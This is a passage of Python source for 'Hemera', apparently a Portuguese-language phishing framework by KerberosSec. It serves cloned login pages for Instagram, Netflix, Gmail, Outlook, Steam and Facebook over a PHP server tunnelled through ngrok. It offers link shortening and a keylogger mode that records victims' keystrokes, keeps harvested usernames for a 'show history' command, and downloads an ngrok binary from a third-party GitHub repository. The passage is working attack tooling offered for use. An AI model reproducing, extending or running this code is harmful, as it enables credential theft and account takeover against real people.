                   time.sleep(2.5)
                   os.popen("rm templates/steam/usernames.txt > /dev/null 2>&1")
                   os.popen("rm templates/steam/ip.txt > /dev/null 2>&1")
                   os.popen("rm templates/steam/ip_log.txt > /dev/null 2>&1")
                   os.system("rm templates/steam/KeyloggerData.txt > /dev/null 2>&1")
                   print ("\n" + A + G + "═════════════════════════════════════")
                   stop()
       else:
         banner_program()
         print ("\n" + W + "[" + G + "●" + W + "]" + C + " Servidor PHP Ativo" + A + G + " OK")
         print ("\n" + W + "[" + R + "●" + W + "]" + C + " Servidor Ngrok Falhou" + A + R + " OFF")
         print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível obter a URL do Ngrok")
         time.sleep(2.5)
         retorno = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja Tentar novamente? Y/n: " + G))
         if (retorno == "Y" or retorno == "y" or retorno == "yes" or retorno == "YES" or retorno == "s" or retorno == "sim"):
           banner_program()
           os.popen("pkill -f -2 php > /dev/null 2>&1")
           os.popen("killall -2 php > /dev/null 2>&1")
           os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
           os.popen("killall -2 ngrok > /dev/null 2>&1")
           os.popen("rm curl.txt > /dev/null 2>&1")
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           stop()
     else:
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Ngrok não está instalado!")
       install_ngrok = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Deseja instalar o Ngrok? Y/n: " + G))
       if (install_ngrok == "Y" or install_ngrok == "y" or install_ngrok == "yes" or install_ngrok == "YES" or install_ngrok == "s" or install_ngrok == "sim"):
         print ("\n" + W + "[" + G + "+" + W + "]" + C + " Instalando Ngrok...")
         os.system("git clone https://github.com/PSecurity/ps.ngrok > /dev/null 2>&1")
         os.system("cd ps.ngrok && mv ngrok .. > /dev/null 2>&1 && cd .. && rm -rf ps.ngrok > /dev/null 2>&1 && chmod +x ngrok")
         time.sleep(40)
         verificar_instalacao = os.path.exists("ngrok")
         if (verificar_instalacao == True):
           banner_program()
           phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
         else:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não foi possível instalar o Ngrok")
           stop()

def menu_log():
   banner_program()
   os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
   os.popen("killall -2 ngrok > /dev/null 2>&1")
   arquivo_log = open("config_log.txt", "r")
   leitura_log = arquivo_log.read()
   definir_log = leitura_log.split()
   template_phishing = str(definir_log[0])
   porta = int(definir_log[1])
   url_action = str(definir_log[2])
   encurtar_url = str(definir_log[3])
   keylogger = str(definir_log[4])
   arquivo_log.close()
   print ("\n" + W + "[" + A + G + "+" + W + "]" + C + " Digite " + G + "help" + C + " ou " + G + "?" + C + " para obter ajuda")
   while (True):
        dados = str(input("\n" + W + "[" + A + G + "*" + W + "]" + " Hemera > " + A + G))
        prompt = dados.split()
        if (not prompt):
          continue
        elif (prompt[0] == "show" and prompt[1] == "options" or prompt[0] == "SHOW" and prompt[1] == "OPTIONS"):
         try:
           banner_program()
           if (template_phishing == "Sem Template ativo" and url_action == "Sem URL de Destino ativa"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ●" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ●" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
           elif (template_phishing == "Sem Template ativo"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ●" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ✔" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
           elif (url_action == "Sem URL de Destino ativa"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ✔" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ●" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
           else:
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ✔" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ✔" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
             print (tabulate(table, tablefmt="fancy_grid"))
             continue
         except IndexError:
           print ("\n" + W + "[" + R + "-" + W + "]" + C + " Comando incompleto! use: " + W + "show options")
           time.sleep(2.5)
           banner_program()
        elif (prompt[0] == "help" or prompt[0] == "HELP" or prompt[0] == "h" or prompt[0] == "?"):
          banner_program()
          print ("\n" + A + G + "[+]═══════════════════════════[ AJUDA/HELP ]══════════════════════════════════[+]")
          print ("\n" + A + C + "Comando:" + W + " show options " + C + "=> " + R + "exibir configurações")
          print ("\n" + A + C + "Comando:" + W + " show templates " + C + "=> " + G + "exibir templates disponiveis")
          print ("\n" + A + C + "Comando:" + W + " show history " + C + "=> " + G + "exibir dados coletados do alvo anterior")
          print ("\n" + A + C + "Comando:" + W + " set template (instagram,facebook,gmail) " + C + "=> " + R + "setar um Template")
          print ("\n" + A + C + "Comando:" + W + " set porta (80,8080) " + C + "=> " + R + "setar uma Porta")
          print ("\n" + A + C + "Comando:" + W + " set action url (link destino após o alvo cair no Phishing) " + C + "=> " + R + "setar uma URL de Destino")
          print ("\n" + A + C + "Comando:" + W + " set url encurter (on,off) " + C + "=> " + R + "ativar ou desativar modo encurtar url do Phishing")
          print ("\n" + A + C + "Comando:" + W + " set keylogger mode (on,off) " + C + "=> " + G + "ativar ou desativar modo Keylogger (captura de teclas do alvo)")
          print ("\n" + A + C + "Comando:" + W + " help " + C + "=> " + R + "obter ajuda")
          print ("\n" + A + C + "Comando:" + W + " banner " + C + "=> " + G + "Altera o Banner do Hemera")
          print ("\n" + A + C + "Comando:" + W + " exploit " + C + "=> " + R + "Executa o Phishing")
          print ("\n" + A + C + "Comando:" + W + " sair " + C + "=> " + R + "sair do Programa")
          print ("\n" + A + G + "[+]═══════════════════════════════════════════════════════════════════════════[+]")
        elif (prompt[0] == "set" and prompt[1] == "template"):
          try:
            template_phishing = str(prompt[2])
            if (template_phishing == "instagram" or template_phishing == "facebook" or template_phishing == "gmail" or template_phishing == "outlook" or template_phishing == "steam" or template_phishing == "facebook"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " O Template %s é inválido" %template_phishing)
              template_phishing = "Sem Template ativo"
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " O comando está incorreto!")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "banner" or prompt[0] == "BANNER"):
          banner_program()
          continue
        elif (prompt[0] == "show" and prompt[1] == "templates" or prompt[0] == "SHOW" and prompt[1] == "TEMPLATES"):
          print ("\n" +  C + "Templates Disponiveis:" + G + " [instagram] [gmail] [netflix] [outlook] [steam] [facebook]")
          continue
        elif (prompt[0] == "set" and prompt[1] == "keylogger" and prompt[2] == "mode"):
          try:
            keylogger = str(prompt[3])
            if (keylogger == "on" or keylogger == "ON" or keylogger == "off" or keylogger == "OFF"):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite" + R + " on " + C + "ou " + R + "off")
              keylogger = "off"
              time.sleep(2.5)
              banner_program()
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um valor válido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "show" and prompt[1] == "history" or prompt[0] == "SHOW" and prompt[1] == "HISTORY"):
          if (template_phishing == "instagram" or template_phishing == "netflix" or template_phishing == "gmail" or template_phishing == "outlook" or template_phishing == "steam"):
            verificar_historico = os.path.exists("templates/" + template_phishing + "/logs/usernames.txt")
            if (verificar_historico == True):
              history = open("templates/" + template_phishing + "/logs/usernames.txt", "r")
              history_data = history.read()
              print ("\n" + W + "[" + G + "+" + W + "]" + G + " %s" %history_data)
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não existe nenhum dado Armazenado")
              time.sleep(2.5)
              banner_program()
          else:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Não existe nenhum Template selecionado!")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "porta"):
          try:
            porta = int(prompt[2])
            if (porta == 22 or porta == 23 or porta == 53 or porta == 443):
              porta = 8080
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A Porta digitada é usada por um serviço!")
              time.sleep(2.5)
              banner_program()
            else:
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma Porta válida")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "url" and prompt[2] == "encurter"):
          try:
            encurtar_url = str(prompt[3])
            if (encurtar_url == "on" or encurtar_url == "ON" or encurtar_url == "off" or encurtar_url == "OFF"):
              continue
            else:
              encurtar_url = "off"
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite" + R + " on " + C + "ou " + R + "off")
              time.sleep(2.5)
              banner_program()
          except IndexError:
            encurtar_url = "off"
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Valor inválido")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "set" and prompt[1] == "action" and prompt[2] == "url"):
          try:
            url_action = str(prompt[3])
            verificar_action = "https://" in url_action
            if (verificar_action == True):
              continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(2.5)
              banner_program()
              continue
          except IndexError:
            print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite uma URL válida")
            time.sleep(2.5)
            banner_program()
        elif (prompt[0] == "exploit" or prompt[0] == "EXPLOIT" or prompt[0] == "run"):
            verificar_action_url = "https://" in url_action
            if (verificar_action_url == True):
              if (template_phishing == "Sem Template ativo"):
                print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "set template " + C + "está incorreta!")
                time.sleep(2.5)
                banner_program()
              else:
                if (encurtar_url == "on" and keylogger == "on" or encurtar_url == "ON" and keylogger == "ON"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                elif (encurtar_url == "off" and keylogger == "off" or encurtar_url == "OFF" and keylogger == "OFF"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  arquivo.write("\n" + url_action)
                  arquivo.write("\n" + encurtar_url)
                  arquivo.write("\n" + keylogger)
                  arquivo.close()
                  phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
                  break
                else:
                  print ("\n" + W + "[" + R + "-" + W + "]" + C + " As opções " + R + "url encurter " + C + "e " + R + "keylogger mode " + C + "não podem ser diferentes!")
                  time.sleep(2.5)
                  banner_program()
                  continue
            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção " + R + "action url" + C + " está incorreta!")
              time.sleep(2.5)
              banner_program()
        elif (prompt[0] == "sair" or prompt[0] == "SAIR" or prompt[0] == "quit" or prompt[0] == "exit"):
          stop()
          break

def interface_grafica():
   global template_phishing
   global porta
   global url_action
   global encurtar_url
   global keylogger
   banner_program()
   print ("\n" + W + "            [" + A + G + "01" + W + "]" + A + G + " ▂▃▄▅▆▇▓▒░" + A + C + " Instagram" + A + G + " ░▒▓▇▆▅▄▃▂")
   print ("\n" + W + "            [" + A + G + "02" + W + "]" + A + G + " ▂▃▄▅▆▇▓▒░" + A + C + " Netflix" + A + G + " ░▒▓▇▆▅▄▃▂")
   print ("\n" + W + "            [" + A + G + "03" + W + "]" + A + G + " ▂▃▄▅▆▇▓▒░" + A + C + " Gmail" + A + G + " ░▒▓▇▆▅▄▃▂")
   print ("\n" + W + "            [" + A + G + "04" + W + "]" + A + G + " ▂▃▄▅▆▇▓▒░" + A + C + " Outlook" + A + G + " ░▒▓▇▆▅▄▃▂")
   print ("\n" + W + "            [" + A + G + "05" + W + "]" + A + G + " ▂▃▄▅▆▇▓▒░" + A + C + " Steam" + A + G + " ░▒▓▇▆▅▄▃▂")
   print ("\n" + W + "            [" + A + G + "06" + W + "]" + A + G + " ▂▃▄▅▆▇▓▒░" + A + C + " Facebook" + A + G + " ░▒▓▇▆▅▄▃▂")
   option = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Escolha um Template: " + A + G))

   if (option == "1" or option == "01"): #Instagram
     template_phishing = "instagram"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

   elif (option == "2" or option == "02"): #Netflix
     template_phishing = "netflix"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

   elif (option == "3" or option == "03"): #Gmail
     template_phishing = "gmail"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

   elif (option == "4" or option == "04"): #Outlook
     template_phishing = "outlook"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

   elif (option == "5" or option == "05"): #Steam
     template_phishing = "steam"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

   elif (option == "6" or option == "06"): #Facebook
     template_phishing = "facebook"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

   else:
     print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção digitada é inválida")
     time.sleep(2.5)
     banner_program()
     interface_grafica()

def porta_program(template_phishing,porta,url_action,encurtar_url,keylogger):
   banner_program()
   try:
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "?" + C + " ou " + G + "help" + C + " para obter ajuda")
     porta = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Escolha uma Porta: " + A + G))
     if (porta == "80" or porta == "22" or porta == "443" or porta == "3128"):
       porta = 8080
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " A porta digitada possui um serviço!")
       time.sleep(2.5)
       banner_program()
       porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)
     elif (porta == "?" or porta == "help" or porta == "HELP"):
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " A porta é um determinado número que o Servidor PHP deverá escutar")
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " Exemplo: " + G + "8080")
       entrada = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Pressione " + G + "Enter" + C + " para retornar para a opção"))
       porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)
     else:
       porta = int(porta)
       url_program(template_phishing,porta,url_action,encurtar_url,keylogger)
   except ValueError:
       porta = 8080
       print ("\n" + W + "[" + R + "-" + W + "]" + C + " Digite um número para a porta!")
       time.sleep(2.5)
       porta_program(template_phishing,porta,url_action,encurtar_url,keylogger)

def url_program(template_phishing,porta,url_action,encurtar_url,keylogger):
   banner_program()
   print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "?" + C + " ou " + G + "help" + C + " para obter ajuda")
   url_action = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Digite a URL de ação: " + A + G))
   verificar_url = "https://" in url_action
   if (verificar_url == True):
     banner_program()
     escolha2 = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Deseja usar modo Encurtar URL e Keylogger? : " + A + G))
     if (escolha2 == "sim" or escolha2 == "s" or escolha2 == "yes" or escolha2 == "y" or escolha2 == "SIM" or escolha2 == "YES"):
       encurtar_url = "on"
       keylogger = "on"
       banner_program()
       phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
     else:
       banner_program()
       phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger)
   elif (url_action == "?" or url_action == "help" or url_action == "HELP"):
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " A URL de ação é um Link de destino que será utilizado após o alvo cair no Phishing, é um site posterior após o Phishing.")
     print ("\n" + W + "[" + G + "+" + W + "]" + C + " Exemplo: " + G + "https://www.example.com")
     entrada = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Pressione " + G + "Enter" + C + " para retornar para a opção"))
     url_program(template_phishing,porta,url_action,encurtar_url,keylogger)
   else:
     print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL digitada não possui https!")
     url_action = "Sem URL de Destino ativa"
     time.sleep(2.5)
     url_program(template_phishing,porta,url_action,encurtar_url,keylogger)

def stop():
   os.popen("pkill -f -2 php > /dev/null 2>&1")
   os.popen("killall -2 php > /dev/null 2>&1")
   os.popen("pkill -f -2 ngrok > /dev/null 2>&1")
   os.popen("killall -2 ngrok > /dev/null 2>&1")
   time.sleep(1)
   os.popen("rm templates/instagram/ip_log.txt > /dev/null 2>&1")
   os.popen("rm KeyloggerData.txt > /dev/null 2>&1")
   os.popen("rm curl.txt > /dev/null 2>&1")
   sys.exit(1)

try:
  verificar_dependencias()
  menu_program()

except KeyboardInterrupt:
  stop()

finally:
  enter_program = str(input("\n" + W + "[" + G + "+" + W + "]" + C + " Pressione " + G + "Enter" + C + " para finalizar o Hemera"))
  banner_program()
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " Obrigado por utilizar o Programa")
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " Thanks for using the program")
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " Site da Kerberos Sec: " + A + G + "https://kerberossec.wordpress.com")
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " GitHub: " + A + G + "https://github.com/KerberosSec")
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " YouTube: " + A + G + "https://www.youtube.com/channel/UCAQ9F2ANiBCnMVxa_a_1v-w")
  print ("\n" + W + "[" + G + "+" + W + "]" + C + " Copyright © 2021 KerberosSec")
  time.sleep(3.2)
